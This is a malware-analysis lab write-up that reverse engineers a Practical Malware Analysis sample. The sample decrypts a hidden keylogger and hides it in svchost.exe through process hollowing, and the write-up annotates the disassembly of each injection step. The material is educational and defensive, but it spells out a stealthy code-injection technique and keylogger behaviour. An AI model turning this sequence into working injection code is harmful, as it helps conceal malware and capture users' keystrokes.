This is a walkthrough of the Lab 12-2 from the book _Practical Malware Analysis_ showing how to reverse engineer a malware sample performing process hollowing.

The [samples for this lab can be downloaded from here](https://github.com/iosonogio/PracticalMalwareAnalysis-Labs).

Let's start!

## Hashes

## PE structure

Sections look OK. The sample is not packed.

There is one embedded resource named `LOCALIZATION` in the `.rsrc` section. I can dump this resource using the Resource Hacker tool: the resource appears to contain raw binary data.

## Interesting strings

```
\svchost.exe
NtUnmapViewOfSection
ntdll.dll
```

The `NtUnmapViewOfSection` string looks like an import that the malware may resolve at runtime using `GetProcAddress`.

## Interesting imports

```
FindResourceA
LoadResource
LockResource
SizeofResource
FreeResource

CreateFileA
ReadFile
WriteFile

ReadProcessMemory

VirtualAllocEx
WriteProcessMemory
SetThreadContext
ResumeThread
```

## Code Analysis

The `main` function starts by getting a handle to the malware executable.

Then it calls a subroutine (`sub_40149D`) to obtain the full path to the Windows `svchost.exe` executable, which is a system process used to host multiple Windows services. The full path is stored in the `ApplicationName` local variable.

Next the function `sub_40132C` is called with the handle to the malware executable as a parameter.

### Dropping the embedded resource (function `sub_40132C`)

The purpose of the `sub_40132C` function is to drop the embedded resource, copy it in memory and decode it. So I renamed it to `Sub_DropResource`.

This function looks inside the malware executable for a resource named `LOCALIZATION`; the resource is loaded and copied into a newly allocated memory space.
The resource is encrypted, so the malware calls the subroutine `sub_401000` to decrypt the resource in memory.

The decryption routine is called only if the first two bytes of the resource are not `0x4D 0x5A`; since these two bytes are the MZ signature of DOS executables, I guess that the resource is an ecnrypted PE executable. So the main malware module is indeed a loader (or dropper).

After decryption, the pointer to the decrypted resource in memory is returned to the calling main function and saved in the `lpBuffer` variable.

### Decryption routine (function `sub_401000`)

Let's give a quick look at the decryption routine `sub_401000` (renamed to `Sub_DecryptResource`).

This routine takes three parameters:

* the pointer to the resource in memory (`arg_0`)
* the size of the resource (`arg_4`)
* the hex key `0x41` (`arg_8`)

The decryption routine loops through each byte of the dumped resource and performs a XOR operation with the key `0x41`:

```assembly
00401026 xor     al, [ebp+arg_8]
```

If I place a breakpoint in OllyDbg at `0x401036` (ie. right before the decryption function returns) I can see what the resource in memory looks like after decryption.
The resource in memory is pointed to by `arg_0`: the following is the beginning of the decrypted resource in memory (notice the `MZ` signature):

```
00350000  4D 5A 90 00 03 00 00 00  MZ¬ê......
00350008  04 00 00 00 FF FF 00 00  ........
00350010  B8 00 00 00 00 00 00 00  ........
```

I can obtain the fully decrypted resource from its original version by applying the XOR transformation using a tool like Cyber Chef or via a simple python script like this:

```python
#!/usr/bin/python

b = bytearray(open('Lab12-02-LOCALIZATION','rb').read())
for i in range(len(b)):
	b[i] ^= 0x41
open('Lab12-02-LOCALIZATION.decrypted','wb').write(b)
```

The decrypted resource is indeed a DOS executable. I will analyze it later.

## Process hollowing (function `sub_4010EA`)

After dropping and decrypting its embedded resource in memory, the malware calls the function `sub_4010EA`. Since I know (after my analysis) that this function performs process hollowing, I renamed it to `Sub_ProcessHollow`.

```assembly
00401539 mov     edx, [ebp+lpBuffer]
0040153C push    edx             ; lpBuffer
0040153D lea     eax, [ebp+ApplicationName]
00401543 push    eax             ; lpApplicationName
00401544 call    sub_4010EA
```

This function takes two parameters:

* the full path to Windows `svchost.exe` executable (`lpApplicationName`)
* the pointer to the decrypted dropped resource in memory

I renamed the pointer to the decrypted executable to `lpDecryptedResource`.

The function `sub_4010EA` first checks the dropped resource for the MZ magic value (`0x4D 0x5A`) and then the PE magic value (`0x50 0x45`). The PE magic value is located at the offset specified at offset `0x3C` (the offset `0x3C` is the last field of `IMAGE_DOS_HEADER`).
If those bytes are as expected then the program continues.

By the way, the pointer to the PE header of the dropped executable is saved into `var_8` which I renamed to `Var_PEHeader`. The malware will be using this pointer later on.

Now the process hollowing process begins.

## Process Hollowing

The malware creates a process by calling the function `CreateProcessA` (at `0x40115F`); the process executable is `svchost.exe`.

As we will see shortly, the process is created in a _suspended state_. This is a clear indication that the malware is attempting to perform **process hollowing** (or **process replacement**): it overwrites the memory space of the legit `svchost.exe` with some other malicious code that it wants to hide (in this case, most certainly, the dropped executable!)

Process hollowing works as follows:

1. The malware creates a legit process in a suspended state where to hide its malicious code (function called: `CreateProcessA`).

2. The malware releases the memory of the suspended process (function called: `NtUnmapViewOfSection`).

3. The malware allocates new memory within the suspended process where to write its malicious code (function called: `VirtualAllocEx`).

4. The malware writes its malicious code into the newly allocated memory region (function called: `WriteProcessMemory` followed by a loop).

5. The malware restores the victim process environment to make the malicious code run, by setting its entry point to point to the malicious code (function called: `SetThreadContext`).

6. The malware resumes the suspended thread, thus initiating the execution of the malicious code (function called: `ResumeThread`).

Such a sequence of function calls makes a pattern indicating that the malware is performing process hollowing.

Let's dig into the details of each step:

### Creating a process in a suspended state

This is the call to `CreateProcessA`:

```assembly
00401145 lea     edx, [ebp+hProcess]
00401148 push    edx             ; lpProcessInformation
00401149 lea     eax, [ebp+StartupInfo]
0040114C push    eax             ; lpStartupInfo
0040114D push    0               ; lpCurrentDirectory
0040114F push    0               ; lpEnvironment
00401151 push    4               ; dwCreationFlags
00401153 push    0               ; bInheritHandles
00401155 push    0               ; lpThreadAttributes
00401157 push    0               ; lpProcessAttributes
00401159 push    0               ; lpCommandLine
0040115B mov     ecx, [ebp+lpApplicationName]
0040115E push    ecx             ; lpApplicationName
0040115F call    ds:CreateProcessA
```

The function `CreateProcessA` takes many parameters, among which:

* `lpApplicationName`: this is the name of the module to be executed, i.e. `svchost.exe`

* `dwCreationFlags`: these flags control the creation of the process; the value 4 means `CREATE_SUSPENDED` so **the process will be created in a suspended state and will not run until the `ResumeThread` function is called**.

* `lpStartupInfo`: a pointer to a `STARTUPINFO` structure, passed in the `StartupInfo` variable.

* `lpProcessInformation`: a pointer to a `PROCESS_INFORMATION` structure that will receive the identification information about the new proces; passed in the `lpProcessInformation` variable.

Let's follow the execution in OllyDbg. Before executing, I place a breakpoint at `0x40115F` (right before the call to `CreateProcessA`); if I step over to the next instruction, I can see in Process Explorer that the new process is indeed created as _Suspended_.

![WriteProcessMemory loop](/media/pma/lab-12-02/suspended.png)

I will keep the debugger paused and step over the execution as needed during the following analysis.

### Obtaining the ImageBase address of the suspended process

After creating a new `svchost.exe` process in a suspended state, the malware obtains a handle to the suspended thread by calling `GetThreadContext` at `0x401195`.
The `GetThreadContext` function is passed the `hThread` parameter, which comes from the same `PROCESS_INFORMATION` structure passed to `CreateProcessA`; this thread handle is used to interact with the suspended process.

The `hThread` value is `0x44`. Other than looking in the stack view of the debugger, I can also read the thread handle in Process Hacker: just double-click on the Lab12-02.exe process, open the Handles tab and look for the Thread type. By the way, this same window also shows the Process handle value (0x34).

![WriteProcessMemory loop](/media/pma/lab-12-02/processhacker-threadhandle.png)

The `GetThreadContext` function returns the thread context in a `CONTEXT` structure which is pointed to by the `lpContext` parameter (for such a structure the program just allocated memory space by calling `VirtualAlloc` at `0x40117B`).

```assembly
0040117B call    ds:VirtualAlloc
00401181 mov     [ebp+lpContext], eax
00401184 mov     edx, [ebp+lpContext]
00401187 mov     dword ptr [edx], 10007h
0040118D mov     eax, [ebp+lpContext]
00401190 push    eax             ; lpContext
00401191 mov     ecx, [ebp+hProcess.hThread]
00401194 push    ecx             ; hThread
00401195 call    ds:GetThreadContext
```


After that, the malware uses the `CONTEXT` structure (pointed to by `lpContext`) in a call to `ReadProcessMemory`:

```assembly
004011B8 push    0               ; lpNumberOfBytesRead
004011BA push    4               ; nSize
004011BC lea     edx, [ebp+Buffer]
004011BF push    edx             ; lpBuffer
004011C0 mov     eax, [ebp+lpContext]
004011C3 mov     ecx, [eax+0A4h]
004011C9 add     ecx, 8
004011CC push    ecx             ; lpBaseAddress
004011CD mov     edx, [ebp+hProcess.hProcess]
004011D0 push    edx             ; hProcess
004011D1 call    ds:ReadProcessMemory
```

Here the malware is reading 4 bytes (`nSize` = 4) from the memory space of the `svchost.exe` process (`hProcess` = 0x34) starting at the `lpBaseAddress` address.
The `lpBaseAddress` is calculated as follows:

```assembly
lpBaseAddress = lpContext + 0xA4 + 0x8
```

What is this address pointing to?

To answer this question, we need to understand the `CONTEXT` structure.

So let's add a new structure in IDA Pro: open the Structures tab and press the `Ins` key to add a new structure; then click on `Add standard structure`, select the `CONTEXT` type name and click OK.
In the Structures tab double-click the `CONTEXT` structure to expand it; at offset `0xA4` we read `Ebx`, so this offset references the EBX register of the thread.

![WriteProcessMemory loop](/media/pma/lab-12-02/context-structure.png)

Now in the Assembly view, at location `0x4011C3`, if we right-click over `0A4h` we can expand that value to read as the following:

```assembly
004011C3 mov     ecx, [eax+CONTEXT.Ebx]
```

The EBX register of a newly created process always contains a pointer to the **Process Environment Block (PEB)** data structure. The PEB structure is not part of the standard IDA Pro data structures but we can search on the Internet (https://www.aldeid.com/wiki/PEB-Process-Environment-Block) to discover that **at offset `0x8` there is the pointer to the `ImageBaseAddress`**.

So the `lpBaseAddress` is pointing to the `ImageBaseAddress`, that is to **the start of the loaded executable** (`svchost.exe`).

The `lpBaseAddress` value is `0x7FFDF008`; I can inspect the memory area of the suspended `svchost.exe` also using the Memory tab of Process Hacker: the PEB is showed at address `0x7FFDF000` and at offset `0x8` I can see the `ImageBaseAddress` pointer value of `0x01000000` (`01` followed by six zeroes).

![WriteProcessMemory loop](/media/pma/lab-12-02/peb.png)

Then reading 4 bytes starting at the `lpBaseAddress`, will place the ImageBase address of the suspended process (ie: `0x01000000`) into the `Buffer` variable. This is the dump view of the `Buffer` variable after the call to `ReadProcessMemory`:

```
0012FAFC  00 00 00 01 00 00 00 00  ........
```

### Unmapping the suspended process from memory

The program manually resolves the import `NtUnmapViewOfSection` using `GetProcAddress` at `0x4011E8`:

```assembly
004011D7 push    offset ProcName ; "NtUnmapViewOfSection"
004011DC push    offset ModuleName ; "ntdll.dll"
004011E1 call    ds:GetModuleHandleA
004011E7 push    eax             ; hModule
004011E8 call    ds:GetProcAddress
004011EE mov     [ebp+var_64], eax
```

The address of `NtUnmapViewOfSection` is placed in a variable named `var_64`; the function is then called at `0x401206`, passing in the ImageBase address of the suspended process (`Buffer` = `0x01000000`) and the handle to that same process (`hProcess`) as parameters:

```assembly
004011FE mov     eax, [ebp+Buffer] ; ImageBase address of suspended process
00401201 push    eax
00401202 mov     ecx, [ebp+hProcess.hProcess]
00401205 push    ecx
00401206 call    [ebp+var_64]    ; call NtUnmapViewOfSection
```

The malware calls `NtUnmapViewOfSection` to **unmap the suspended process from memory**.

Let's step over and pause the debugger at `0x401206`. This is how the memory of `svchost.exe` appears in Process Hacker right before the call to `NtUnmapViewOfSection`:

![WriteProcessMemory loop](/media/pma/lab-12-02/memory-svchost-before.png)

Let the call execute; now hit the refresh button in the Mememory tab of Process Hacker and see that the memory area of `svchost.exe` is gone:

![WriteProcessMemory loop](/media/pma/lab-12-02/memory-svchost-after.png)

### Allocating new memory space within the suspended process

Now the malware allocates new memory within the address space of the suspended process (`hProcess`). This is the call to `VirtualAllocEx`:

```assembly
00401209 push    40h             ; flProtect
0040120B push    3000h           ; flAllocationType
00401210 mov     edx, [ebp+Var_PEHeader]
00401213 mov     eax, [edx+50h]
00401216 push    eax             ; dwSize
00401217 mov     ecx, [ebp+Var_PEHeader]
0040121A mov     edx, [ecx+34h]
0040121D push    edx             ; lpAddress
0040121E mov     eax, [ebp+hProcess.hProcess]
00401221 push    eax             ; hProcess
00401222 call    ds:VirtualAllocEx
00401228 mov     [ebp+lpBaseAddress], eax
```

Both `lpAddress` and `dwSize` are valued as offsets of the PE header of the dropped executable, respectively `0x34` and `0x50` (the pointer to the PE header was saved in `Var_PEHeader`). Looking at the PE file format documentation (https://www.sunshine2k.de/reversing/tuts/tut_pe.htm), we can verify that:

* offset `0x34` corresponds to the ImageBase address
* offset `0x50` corresponds to the SizeOfImage

We can verify these offsets also opening the decoded dropped executable with PEview (or other similar tool) and looking for the `ImageBase` and `SizeOfImage` fields in the `IMAGE_OPTIONAL_HEADER` header.
_Note: in order to locate the offsets relative to the PE Header, remember that the PE Header itself starts at the offset given in the last field of the `IMAGE_DOS_HEADER` which is at offset `0x3C` relative to the start of the PE file; so in this case the `ImageBase` field is at offset `0xE0`+`0x34`=`0x114` relative to the start of the PE file, and the `SizeOfImage` field at offset `0x130`._

We can add new standard structures in IDA Pro: `IMAGE_DOS_HEADER`, `IMAGE_NT_HEADERS` and `IMAGE_SECTION_HEADER` (I will use the latter lately). Now we can ask IDA Pro to display those offsets in a much more readable way by right-clicking on them and choosing the appropriate offset from the `Structure offset` list. Then the previous code block would appear like the following:

```assembly
00401209 push    40h             ; flProtect
0040120B push    3000h           ; flAllocationType
00401210 mov     edx, [ebp+Var_PEHeader]
00401213 mov     eax, [edx+IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage]
00401216 push    eax             ; dwSize
00401217 mov     ecx, [ebp+Var_PEHeader]
0040121A mov     edx, [ecx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
0040121D push    edx             ; lpAddress
0040121E mov     eax, [ebp+hProcess.hProcess]
00401221 push    eax             ; hProcess
00401222 call    ds:VirtualAllocEx
00401228 mov     [ebp+lpBaseAddress], eax
```

So, back to our malicious program, the call to the `VirtualAllocEx` function will allocate a number of `SizeOfImage` bytes (0x7000) starting at `ImageBase` address (`0x400000`). Since the malware is going to write into this new memory space, the allocation is done with `PAGE_EXECUTE_READWRITE` permissions (`flProtect` = `0x40`).

After the call executes, we can verify in Process Hacker that there is a new memory region at base address `0x400000` which is initialized to zeroes. Notice that the permissions are set to RWX:

![WriteProcessMemory loop](/media/pma/lab-12-02/memory-svchost-newallocated.png)

The pointer to the newly allocated memory region is saved into `lpBaseAddress`.

### Writing the malicious code into the suspended process

After unmapping the original `svchost.exe` image from memory and allocating a new memory region within the suspended process, the malware writes its malicious load into that memory region.

The program first writes the executable headers:

```assembly
0040123C push    0               ; lpNumberOfBytesWritten
0040123E mov     ecx, [ebp+Var_PEHeader]
00401241 mov     edx, [ecx+IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders]
00401244 push    edx             ; nSize
00401245 mov     eax, [ebp+lpDecryptedResource]
00401248 push    eax             ; lpBuffer
00401249 mov     ecx, [ebp+lpBaseAddress]
0040124C push    ecx             ; lpBaseAddress
0040124D mov     edx, [ebp+hProcess.hProcess]
00401250 push    edx             ; hProcess
00401251 call    ds:WriteProcessMemory
```

The call to `WriteProcessMemory` writes a number of `SizeOfHeaders` bytes from the `lpDecryptedResource` executable into the just-allocated memory region pointed to by `lpBaseAddress`.

I can verify looking in Process Hacker:

![WriteProcessMemory loop](/media/pma/lab-12-02/memory-svchost-written.png)

Next, the program cycles thru each PE section, writing the raw bytes of each section.

![WriteProcessMemory loop](/media/pma/lab-12-02/writeprocessmemory-loop.png)

This is the loop body:

```assembly
00401277 mov     eax, [ebp+Var_lpDecryptedResource]
0040127A mov     ecx, [ebp+lpDecryptedResource]
0040127D add     ecx, [eax+IMAGE_DOS_HEADER.e_lfanew]
00401280 mov     edx, [ebp+Var_LoopCounter]
00401283 imul    edx, 28h
00401286 lea     eax, [ecx+edx+0F8h] ; 0xF8 is the PE Header offset which
00401286                         ;     the first section starts at
0040128D mov     [ebp+Var_Section], eax
00401290 push    0               ; lpNumberOfBytesWritten
00401292 mov     ecx, [ebp+Var_Section]
00401295 mov     edx, [ecx+IMAGE_SECTION_HEADER.SizeOfRawData]
00401298 push    edx             ; nSize
00401299 mov     eax, [ebp+Var_Section]
0040129C mov     ecx, [ebp+lpDecryptedResource]
0040129F add     ecx, [eax+IMAGE_SECTION_HEADER.PointerToRawData]
004012A2 push    ecx             ; lpBuffer
004012A3 mov     edx, [ebp+Var_Section]
004012A6 mov     eax, [ebp+lpBaseAddress]
004012A9 add     eax, [edx+IMAGE_SECTION_HEADER.VirtualAddress]
004012AC push    eax             ; lpBaseAddress
004012AD mov     ecx, [ebp+hProcess.hProcess]
004012B0 push    ecx             ; hProcess
004012B1 call    ds:WriteProcessMemory
```

For each PE section, the `WriteProcessMemory` function writes the section's raw bytes into the newly allocated memory region, starting at the address specified by the `IMAGE_SECTION_HEADER.VirtualAddress` field of the section header.

I can inspect the process memory with Process Hacker to verify that each section is written (place a breakpoint at `0x4012B7`).

Once finished writing the sections, the program updates the `ImageBaseAddress` in the PEB with the proper `ImageBase` value read from the dropped executable PE headers:

```assembly
004012B9 push    0
004012BB push    4               ; nSize
004012BD mov     edx, [ebp+Var_PEHeader]
004012C0 add     edx, IMAGE_NT_HEADERS.OptionalHeader.ImageBase
004012C3 push    edx             ; lpBuffer
004012C4 mov     eax, [ebp+lpContext]
004012C7 mov     ecx, [eax+CONTEXT.Ebx] ; PEB
004012CD add     ecx, 8          ;        ImageBaseAddress
004012D0 push    ecx             ; lpBaseAddress
004012D1 mov     edx, [ebp+hProcess.hProcess]
004012D4 push    edx             ; hProcess
004012D5 call    ds:WriteProcessMemory
```

### Setting the entry point of the malicious code and resuming the thread

Then the malware uses `SetThreadContext` to set the `EAX` register to the entry point of the executable that was just loaded into the suspended process, so that its execution will resume from there.

The pointer to the EAX register is found in the `CONTEXT` structure at offset `0xB0` (instruction at `0x4012E7`).

```assembly
004012DB mov     eax, [ebp+Var_PEHeader]
004012DE mov     ecx, [ebp+lpBaseAddress]
004012E1 add     ecx, [eax+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
004012E4 mov     edx, [ebp+lpContext]
004012E7 mov     [edx+CONTEXT.Eax], ecx
004012ED mov     eax, [ebp+lpContext]
004012F0 push    eax             ; lpContext
004012F1 mov     ecx, [ebp+hProcess.hThread]
004012F4 push    ecx             ; hThread
004012F5 call    ds:SetThreadContext
```

And finally the thread is resumed!

```assembly
004012FB mov     edx, [ebp+hProcess.hThread]
004012FE push    edx             ; hThread
004012FF call    ds:ResumeThread
```

Wow, that's how process hollowing works under the hood!

This terminates the `main` function.


## Analysis of the dropped executable

Hashes:

```

9b683d2fda7ca7adcc043e4412271009a0e115ca55f9a718c385a3f46b57ae6b
```

A quick analysis of the strings and the imports is sufficient to infer that the dropped executable is a keylogger.

The following strings suggest that the malware may perform some keylogging activity:

```
practicalmalwareanalysis.log
[SHIFT]
[ENTER]
[BACKSPACE]
[TAB]
[CTRL]
[DEL]
[CAPS LOCK]
```

The following imported functions are a clear indication that the malware is performing **hook injection**:

```
SetWindowsHookExA
CallNextHookEx
UnhookWindowsHookEx
```

Hook injection is a technique that abuses Windows hooks to intercept messages destined for application and is frequently used by keyloggers.

The following imports support the keylogger hypothesis:

```
GetWindowTextA
GetForegroundWindow
WriteFile
CreateFileA
```

Disassembling the dropped executable with IDA Pro confirms that this is a keylogger that hooks to the `WH_KEYBOARD_LL` event (at `0x401058`).

The main function performs the hooking.

The `sub_4010C7` routine takes care of the keylogging functionality. A quick analysis of this function reveals that the keys pressed are written to a file named `practicalmalwareanalysis.log`, along with the name of the application window they are pressed in.

I won't go into further details here.

That's all for this lab!
